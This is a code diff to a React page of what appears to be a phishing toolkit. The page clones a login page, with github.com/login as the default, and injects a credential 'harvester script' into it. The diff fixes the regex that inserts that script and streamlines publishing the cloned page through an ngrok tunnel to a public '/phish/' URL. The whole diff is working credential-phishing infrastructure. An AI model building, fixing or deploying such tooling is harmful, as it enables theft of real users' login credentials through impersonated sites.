@@ -19,7 +19,7 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Textarea } from '@/components/ui/textarea';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
-import { startNgrokTunnel, getNgrokTunnelUrl } from '@/services/ngrok-service';
+import { startNgrokTunnel } from '@/services/ngrok-service';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -41,7 +41,6 @@ export default function PhishingPage() {
   const [hostedUrl, setHostedUrl] = useState<string | null>(null);
   const [isProcessing, setIsProcessing] = useState(false);
   const [isHosting, setIsHosting] = useState(false);
-  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
   const form = useForm<z.infer<typeof clonerSchema>>({
     resolver: zodResolver(clonerSchema),
@@ -88,9 +87,6 @@ export default function PhishingPage() {
     window.addEventListener('storage', handleStorageChange);
     return () => {
       window.removeEventListener('storage', handleStorageChange);
-      if (pollIntervalRef.current) {
-        clearInterval(pollIntervalRef.current);
-      }
     };
   }, [capturedCredentials.length, toast]);
 
@@ -105,9 +101,6 @@ export default function PhishingPage() {
     setHostedUrl(null);
     setIsProcessing(false);
     setIsHosting(false);
-    if (pollIntervalRef.current) {
-      clearInterval(pollIntervalRef.current);
-    }
     form.reset({
       redirectUrl: 'https://github.com/password_reset',
       urlToClone: 'https://github.com/login',
@@ -211,7 +204,7 @@ export default function PhishingPage() {
 
       // Inject harvester script
       if (html.includes('</body>')) {
-          html = html.replace(/<\\/body>/i, `${harvesterScript}</body>`);
+          html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
       } else {
           html += harvesterScript;
       }
@@ -232,48 +225,35 @@ export default function PhishingPage() {
     setIsHosting(true);
     setHostedUrl(null);
     
-
     try {
       toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
-      // Start the tunnel and get its ID
-      const { id } = await startNgrokTunnel();
 
-      const pageId = crypto.randomUUID();
-      const storageKey = 'phishing-html-' + pageId;
-      localStorage.setItem(storageKey, modifiedHtml);
-      
-      // Poll for the URL using the ID
-      pollIntervalRef.current = setInterval(async () => {
-        try {
-          const { status, url } = await getNgrokTunnelUrl({ id });
-          if (status === 'connected' && url) {
-            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-            const finalUrl = `${url}/phish/${pageId}`;
-            setHostedUrl(finalUrl);
-            setIsHosting(false);
-            toast({ title: "Public Link Generated!", description: "Your phishing page is accessible via ngrok." });
-            const urlToClone = form.getValues('urlToClone');
-            logActivity({
-                user: user?.displayName || 'Operator',
-                action: 'Generated Phishing Link',
-                details: `Source: ${urlToClone || 'Pasted HTML'}`,
-            });
-          } else if (status === 'error') {
-            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-            setIsHosting(false);
-            toast({ variant: 'destructive', title: "Link Generation Failed", description: "Could not establish ngrok tunnel." });
-          }
-        } catch (pollError) {
-            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-            setIsHosting(false);
-            toast({ variant: 'destructive', title: "Polling Error", description: "An error occurred while checking for the ngrok URL." });
-        }
-        // If status is 'connecting', do nothing and wait for the next poll.
-      }, 2000); // Poll every 2 seconds
+      // Start the tunnel and wait for the URL
+      const { url } = await startNgrokTunnel();
+
+      if (url) {
+        const pageId = crypto.randomUUID();
+        const pageStorageKey = `phishing-html-${pageId}`;
+        localStorage.setItem(pageStorageKey, modifiedHtml);
+
+        const finalUrl = `${url}/phish/${pageId}`;
+        setHostedUrl(finalUrl);
+        toast({ title: "Public Link Generated!", description: "Your phishing page is now accessible via ngrok." });
+
+        const urlToClone = form.getValues('urlToClone');
+        logActivity({
+            user: user?.displayName || 'Operator',
+            action: 'Generated Phishing Link',
+            details: `Source: ${urlToClone || 'Pasted HTML'}`,
+        });
+      } else {
+         throw new Error("Ngrok did not return a URL.");
+      }
     } catch(err) {
-        setIsHosting(false);
         const error = err instanceof Error ? err.message : "An unknown error occurred";
         toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
+    } finally {
+        setIsHosting(false);
     }
   };
   
